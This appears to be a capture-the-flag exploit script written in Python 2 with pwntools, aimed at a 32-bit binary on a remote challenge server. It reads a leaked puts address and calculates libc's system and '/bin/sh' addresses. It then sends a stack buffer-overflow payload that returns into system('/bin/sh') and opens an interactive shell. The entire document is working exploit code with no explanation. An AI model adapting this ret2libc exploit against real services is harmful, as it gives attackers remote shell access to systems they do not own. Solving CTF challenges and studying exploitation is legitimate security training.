# coding=utf-8
from pwn import *
context.log_level='debug'
context(os='linux',arch='i386',terminal=['tmux','splitw','-h'])

# s=ssh(host=host,port=port,user='CTFMan',password='guest')
# io=s.run('/bin/bash')

#io=process('./prog')
io=remote('150.158.21.50',28072)
# io=remote(path)

elf=ELF('./prog')

libc_file='./libc.so.6'

s=lambda x:io.send(x)
sa=lambda x,y:io.sendafter(x,y)
sl=lambda x:io.sendline(x)
sla=lambda x,y:io.sendlineafter(x,y)
r=lambda x:io.recv(x)
ru=lambda x:io.recvuntil(x)
debug=lambda:gdb.attach(io)	

ru('0x')
puts_addr=int(r(8),16)
print hex(puts_addr)
libc=ELF(libc_file)

libc_base=puts_addr-libc.sym['puts']
print hex(libc_base)
system=libc_base+libc.sym['system']
binsh=libc_base+libc.search('/bin/sh').next()

sl('a'*0x10+p32(system)+p32(0)+p32(binsh))

io.interactive()
